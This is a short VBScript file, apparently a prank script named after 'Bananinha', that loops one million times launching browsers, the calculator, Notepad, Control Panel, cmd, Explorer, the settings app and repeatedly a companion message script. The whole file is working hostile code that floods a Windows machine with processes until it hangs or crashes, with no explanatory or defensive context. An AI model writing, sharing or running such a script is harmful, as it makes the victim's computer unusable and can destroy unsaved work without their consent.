Dim shell, i
Set shell = CreateObject("WScript.Shell")

For i = 1 To 1000000

shell.Run "Pasta-Bananinha\Bananinha-msg.vbs"
shell.Run "chrome.exe"
shell.Run "calc.exe"
shell.Run "Pasta-Bananinha\Bananinha-msg.vbs"
shell.Run "notepad.exe"
shell.Run "control.exe"
shell.Run "Pasta-Bananinha\Bananinha-msg.vbs"
shell.Run "cmd.exe"
shell.Run "msedge.exe"
shell.Run "Pasta-Bananinha\Bananinha-msg.vbs"
shell.Run "ms-settings:"
shell.Run "explorer.exe"
shell.Run "Pasta-Bananinha\Bananinha-msg.vbs"

Next


